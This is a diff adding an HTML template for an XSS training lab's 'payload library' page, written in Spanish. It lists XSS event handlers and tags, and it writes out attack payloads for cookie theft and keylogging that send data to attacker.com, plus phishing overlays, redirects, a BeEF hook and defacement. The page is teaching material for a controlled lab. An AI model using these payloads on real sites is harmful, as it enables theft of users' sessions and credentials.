@@ -1,0 +1,446 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>📚 Payloads XSS - Laboratorio</title>
+    <link rel="stylesheet" href="/static/style.css">
+</head>
+<body>
+    <div class="container">
+        <!-- Header -->
+        <header class="header">
+            <h1>📚 BIBLIOTECA DE PAYLOADS XSS</h1>
+            <p class="subtitle">Ejemplos de payloads para todos los ejercicios</p>
+        </header>
+
+        <!-- Navegación -->
+        <nav class="nav">
+            <a href="/">🏠 Inicio</a>
+            <a href="/reflected">1️⃣ Reflected XSS</a>
+            <a href="/stored">2️⃣ Stored XSS</a>
+            <a href="/dom">3️⃣ DOM-based XSS</a>
+            <a href="/bypass">🎯 Bypass Filtros</a>
+            <a href="/payloads" class="active">📚 Payloads</a>
+        </nav>
+
+        <!-- Contenido Principal -->
+        <main class="main-content">
+            <!-- Introducción -->
+            <section class="intro-section">
+                <h2>🎯 Guía de Payloads XSS</h2>
+                <p class="intro-text">
+                    Esta página contiene una colección completa de payloads XSS organizados por tipo de 
+                    ejercicio. Usa estos ejemplos para practicar en el laboratorio y entender las diferentes 
+                    técnicas de explotación.
+                </p>
+                
+                <div class="warning-box">
+                    <h3>⚠️ Advertencia Importante</h3>
+                    <p>
+                        Estos payloads son solo para uso educativo en entornos controlados. 
+                        <strong>NUNCA</strong> los uses en sitios web sin autorización explícita. 
+                        El uso no autorizado de estas técnicas es ilegal y poco ético.
+                    </p>
+                </div>
+            </section>
+
+            <!-- Payloads por Tipo -->
+            
+            <!-- REFLECTED XSS -->
+            <section class="payload-section">
+                <div class="section-header">
+                    <h2>1️⃣ Payloads para Reflected XSS</h2>
+                    <a href="/reflected" class="btn-link">Ir al Ejercicio →</a>
+                </div>
+                
+                <div class="payloads-list">
+                    {% for payload in payloads.reflected %}
+                    <div class="payload-item">
+                        <div class="payload-header">
+                            <span class="payload-number">{{ loop.index }}</span>
+                            <button onclick="copyText('{{ payload|replace("'", "\\'") }}')" class="btn-copy-small">📋</button>
+                        </div>
+                        <code class="payload-display">{{ payload }}</code>
+                    </div>
+                    {% endfor %}
+                </div>
+                
+                <div class="usage-hint">
+                    <h4>💡 Cómo usar:</h4>
+                    <p>Copia el payload y pégalo en el campo de búsqueda del ejercicio Reflected XSS.</p>
+                </div>
+            </section>
+
+            <!-- STORED XSS -->
+            <section class="payload-section">
+                <div class="section-header">
+                    <h2>2️⃣ Payloads para Stored XSS</h2>
+                    <a href="/stored" class="btn-link">Ir al Ejercicio →</a>
+                </div>
+                
+                <div class="payloads-list">
+                    {% for payload in payloads.stored %}
+                    <div class="payload-item">
+                        <div class="payload-header">
+                            <span class="payload-number">{{ loop.index }}</span>
+                            <button onclick="copyText('{{ payload|replace("'", "\\'") }}')" class="btn-copy-small">📋</button>
+                        </div>
+                        <code class="payload-display">{{ payload }}</code>
+                    </div>
+                    {% endfor %}
+                </div>
+                
+                <div class="usage-hint">
+                    <h4>💡 Cómo usar:</h4>
+                    <p>Copia el payload y pégalo en el campo de comentario del ejercicio Stored XSS.</p>
+                    <p class="warning-text">⚠️ Estos payloads persistirán hasta que reinicies la base de datos.</p>
+                </div>
+            </section>
+
+            <!-- DOM-BASED XSS -->
+            <section class="payload-section">
+                <div class="section-header">
+                    <h2>3️⃣ Payloads para DOM-based XSS</h2>
+                    <a href="/dom" class="btn-link">Ir al Ejercicio →</a>
+                </div>
+                
+                <div class="payloads-list">
+                    {% for payload in payloads.dom %}
+                    <div class="payload-item">
+                        <div class="payload-header">
+                            <span class="payload-number">{{ loop.index }}</span>
+                            <button onclick="copyText('{{ payload|replace("'", "\\'") }}')" class="btn-copy-small">📋</button>
+                        </div>
+                        <code class="payload-display">{{ payload }}</code>
+                    </div>
+                    {% endfor %}
+                </div>
+                
+                <div class="usage-hint">
+                    <h4>💡 Cómo usar:</h4>
+                    <p>Copia el payload y pégalo después del # en la URL: <code>/dom{{ payloads.dom[0] }}</code></p>
+                    <p>O úsalo en el campo de demostración del ejercicio.</p>
+                </div>
+            </section>
+
+            <!-- BYPASS FILTERS -->
+            <section class="payload-section">
+                <div class="section-header">
+                    <h2>🎯 Payloads para Bypass de Filtros</h2>
+                    <a href="/bypass" class="btn-link">Ir al Ejercicio →</a>
+                </div>
+                
+                <div class="payloads-list">
+                    {% for payload in payloads.bypass %}
+                    <div class="payload-item">
+                        <div class="payload-header">
+                            <span class="payload-number">{{ loop.index }}</span>
+                            <button onclick="copyText('{{ payload|replace("'", "\\'") }}')" class="btn-copy-small">📋</button>
+                        </div>
+                        <code class="payload-display">{{ payload }}</code>
+                    </div>
+                    {% endfor %}
+                </div>
+                
+                <div class="usage-hint">
+                    <h4>💡 Cómo usar:</h4>
+                    <p>Estos payloads están diseñados para evadir el filtro débil del ejercicio de Bypass.</p>
+                    <p>Prueba diferentes técnicas de ofuscación y elementos alternativos.</p>
+                </div>
+            </section>
+
+            <!-- Técnicas Especiales -->
+            <section class="techniques-section">
+                <h2>🧪 Técnicas Especiales de XSS</h2>
+                
+                <div class="technique-categories">
+                    <!-- Robo de Cookies -->
+                    <div class="technique-category">
+                        <h3>🍪 Robo de Cookies</h3>
+                        <div class="technique-examples">
+                            <div class="example-item">
+                                <code>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code>
+                                <p>Mostrar cookies en un alert</p>
+                            </div>
+                            <div class="example-item">
+                                <code>&lt;script&gt;fetch('http://attacker.com?c='+document.cookie)&lt;/script&gt;</code>
+                                <p>Enviar cookies a servidor del atacante</p>
+                            </div>
+                            <div class="example-item">
+                                <code>&lt;img src=x onerror=this.src='http://attacker.com?c='+document.cookie&gt;</code>
+                                <p>Exfiltración vía imagen</p>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- Keylogging -->
+                    <div class="technique-category">
+                        <h3>⌨️ Keylogging</h3>
+                        <div class="technique-examples">
+                            <div class="example-item">
+                                <code>&lt;script&gt;document.onkeypress=function(e){console.log(e.key)}&lt;/script&gt;</code>
+                                <p>Capturar teclas presionadas</p>
+                            </div>
+                            <div class="example-item">
+                                <code>&lt;img src=x onerror='document.onkeypress=function(e){fetch("http://attacker.com?k="+e.key)}'&gt;</code>
+                                <p>Enviar teclas a servidor remoto</p>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- Phishing -->
+                    <div class="technique-category">
+                        <h3>🎣 Phishing</h3>
+                        <div class="technique-examples">
+                            <div class="example-item">
+                                <code>&lt;script&gt;document.body.innerHTML='&lt;h1&gt;Login&lt;/h1&gt;&lt;form&gt;...'&lt;/script&gt;</code>
+                                <p>Reemplazar página con formulario falso</p>
+                            </div>
+                            <div class="example-item">
+                                <code>&lt;iframe src="http://fake-login.com" width="100%" height="500"&gt;&lt;/iframe&gt;</code>
+                                <p>Mostrar página de phishing en iframe</p>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- Redirecciones -->
+                    <div class="technique-category">
+                        <h3>🔀 Redirecciones</h3>
+                        <div class="technique-examples">
+                            <div class="example-item">
+                                <code>&lt;script&gt;window.location='http://malicious.com'&lt;/script&gt;</code>
+                                <p>Redirección inmediata</p>
+                            </div>
+                            <div class="example-item">
+                                <code>&lt;meta http-equiv="refresh" content="0;url=http://evil.com"&gt;</code>
+                                <p>Redirección vía meta tag</p>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- BeEF Hook -->
+                    <div class="technique-category">
+                        <h3>🎣 BeEF Framework Hook</h3>
+                        <div class="technique-examples">
+                            <div class="example-item">
+                                <code>&lt;script src="http://beef-server:3000/hook.js"&gt;&lt;/script&gt;</code>
+                                <p>Cargar BeEF para control total del navegador</p>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- Defacement -->
+                    <div class="technique-category">
+                        <h3>🎨 Defacement</h3>
+                        <div class="technique-examples">
+                            <div class="example-item">
+                                <code>&lt;script&gt;document.body.innerHTML='&lt;h1&gt;HACKED!&lt;/h1&gt;'&lt;/script&gt;</code>
+                                <p>Reemplazar contenido de la página</p>
+                            </div>
+                            <div class="example-item">
+                                <code>&lt;style&gt;body{background:red !important}&lt;/style&gt;</code>
+                                <p>Modificar estilos de la página</p>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </section>
+
+            <!-- Eventos HTML5 -->
+            <section class="events-section">
+                <h2>⚡ Eventos HTML5 para XSS</h2>
+                <p>Estos son eventos menos comunes que pueden ejecutar JavaScript:</p>
+                
+                <div class="events-grid">
+                    <div class="event-card">
+                        <h4>onload</h4>
+                        <code>&lt;body onload=alert()&gt;</code>
+                    </div>
+                    <div class="event-card">
+                        <h4>onerror</h4>
+                        <code>&lt;img src=x onerror=alert()&gt;</code>
+                    </div>
+                    <div class="event-card">
+                        <h4>onfocus</h4>
+                        <code>&lt;input autofocus onfocus=alert()&gt;</code>
+                    </div>
+                    <div class="event-card">
+                        <h4>onmouseover</h4>
+                        <code>&lt;div onmouseover=alert()&gt;</code>
+                    </div>
+                    <div class="event-card">
+                        <h4>onclick</h4>
+                        <code>&lt;button onclick=alert()&gt;</code>
+                    </div>
+                    <div class="event-card">
+                        <h4>onchange</h4>
+                        <code>&lt;input onchange=alert()&gt;</code>
+                    </div>
+                    <div class="event-card">
+                        <h4>onsubmit</h4>
+                        <code>&lt;form onsubmit=alert()&gt;</code>
+                    </div>
+                    <div class="event-card">
+                        <h4>onanimationend</h4>
+                        <code>&lt;style&gt;@keyframes x{}&lt;/style&gt;&lt;div onanimationend=alert() style="animation:x 1s"&gt;</code>
+                    </div>
+                    <div class="event-card">
+                        <h4>ontoggle</h4>
+                        <code>&lt;details open ontoggle=alert()&gt;</code>
+                    </div>
+                    <div class="event-card">
+                        <h4>onplay</h4>
+                        <code>&lt;video autoplay onplay=alert()&gt;</code>
+                    </div>
+                    <div class="event-card">
+                        <h4>oncanplay</h4>
+                        <code>&lt;audio autoplay oncanplay=alert()&gt;</code>
+                    </div>
+                    <div class="event-card">
+                        <h4>onpageshow</h4>
+                        <code>&lt;body onpageshow=alert()&gt;</code>
+                    </div>
+                </div>
+            </section>
+
+            <!-- Tags HTML útiles -->
+            <section class="tags-section">
+                <h2>🏷️ Tags HTML para XSS</h2>
+                <p>Elementos HTML que pueden ejecutar JavaScript:</p>
+                
+                <div class="tags-grid">
+                    <div class="tag-item">
+                        <span class="tag-name">&lt;script&gt;</span>
+                        <p>El clásico</p>
+                    </div>
+                    <div class="tag-item">
+                        <span class="tag-name">&lt;img&gt;</span>
+                        <p>Con onerror</p>
+                    </div>
+                    <div class="tag-item">
+                        <span class="tag-name">&lt;svg&gt;</span>
+                        <p>Con onload</p>
+                    </div>
+                    <div class="tag-item">
+                        <span class="tag-name">&lt;iframe&gt;</span>
+                        <p>Con src=javascript:</p>
+                    </div>
+                    <div class="tag-item">
+                        <span class="tag-name">&lt;body&gt;</span>
+                        <p>Con onload</p>
+                    </div>
+                    <div class="tag-item">
+                        <span class="tag-name">&lt;input&gt;</span>
+                        <p>Con onfocus</p>
+                    </div>
+                    <div class="tag-item">
+                        <span class="tag-name">&lt;video&gt;</span>
+                        <p>Con onerror</p>
+                    </div>
+                    <div class="tag-item">
+                        <span class="tag-name">&lt;audio&gt;</span>
+                        <p>Con onerror</p>
+                    </div>
+                    <div class="tag-item">
+                        <span class="tag-name">&lt;object&gt;</span>
+                        <p>Con data</p>
+                    </div>
+                    <div class="tag-item">
+                        <span class="tag-name">&lt;embed&gt;</span>
+                        <p>Con src</p>
+                    </div>
+                    <div class="tag-item">
+                        <span class="tag-name">&lt;details&gt;</span>
+                        <p>Con ontoggle</p>
+                    </div>
+                    <div class="tag-item">
+                        <span class="tag-name">&lt;marquee&gt;</span>
+                        <p>Con onstart</p>
+                    </div>
+                </div>
+            </section>
+
+            <!-- Recursos -->
+            <section class="resources-section">
+                <h2>📖 Recursos Adicionales</h2>
+                <div class="resources-grid">
+                    <div class="resource-card">
+                        <h4>🌐 OWASP XSS Guide</h4>
+                        <p>Guía oficial de OWASP sobre Cross-Site Scripting</p>
+                        <a href="https://owasp.org/www-community/attacks/xss/" target="_blank" class="resource-link">Ver recurso →</a>
+                    </div>
+                    <div class="resource-card">
+                        <h4>📚 PortSwigger Web Security Academy</h4>
+                        <p>Tutoriales interactivos sobre XSS</p>
+                        <a href="https://portswigger.net/web-security/cross-site-scripting" target="_blank" class="resource-link">Ver recurso →</a>
+                    </div>
+                    <div class="resource-card">
+                        <h4>🎯 XSS Game by Google</h4>
+                        <p>Juego educativo para aprender XSS</p>
+                        <a href="https://xss-game.appspot.com/" target="_blank" class="resource-link">Ver recurso →</a>
+                    </div>
+                    <div class="resource-card">
+                        <h4>🔧 DOMPurify</h4>
+                        <p>Librería para sanitizar HTML y prevenir XSS</p>
+                        <a href="https://github.com/cure53/DOMPurify" target="_blank" class="resource-link">Ver recurso →</a>
+                    </div>
+                </div>
+            </section>
+        </main>
+
+        <!-- Footer -->
+        <footer class="footer">
+            <p>🔐 Laboratorio de Ciberseguridad - Biblioteca de Payloads XSS</p>
+            <p>⚠️ Usa estos payloads solo en entornos controlados y con autorización</p>
+        </footer>
+    </div>
+
+    <script>
+        function copyText(text) {
+            navigator.clipboard.writeText(text).then(() => {
+                // Mostrar notificación temporal
+                const notification = document.createElement('div');
+                notification.className = 'copy-notification';
+                notification.textContent = '✅ Payload copiado!';
+                document.body.appendChild(notification);
+                
+                setTimeout(() => {
+                    notification.remove();
+                }, 2000);
+            });
+        }
+
+        // Mensaje en consola
+        console.log('%c📚 BIBLIOTECA DE PAYLOADS XSS', 'color: #00ff00; font-size: 20px; font-weight: bold;');
+        console.log('%cEncuentra payloads organizados para cada tipo de ejercicio', 'color: #00ffff;');
+        console.log('%c⚠️ Recuerda: Solo para uso educativo en entornos controlados', 'color: #ff6b6b; font-weight: bold;');
+    </script>
+
+    <style>
+        .copy-notification {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            background: #00ff00;
+            color: #000;
+            padding: 15px 25px;
+            border-radius: 5px;
+            font-weight: bold;
+            z-index: 9999;
+            animation: slideIn 0.3s ease-out;
+        }
+
+        @keyframes slideIn {
+            from {
+                transform: translateX(400px);
+                opacity: 0;
+            }
+            to {
+                transform: translateX(0);
+                opacity: 1;
+            }
+        }
+    </style>
+</body>
+</html>
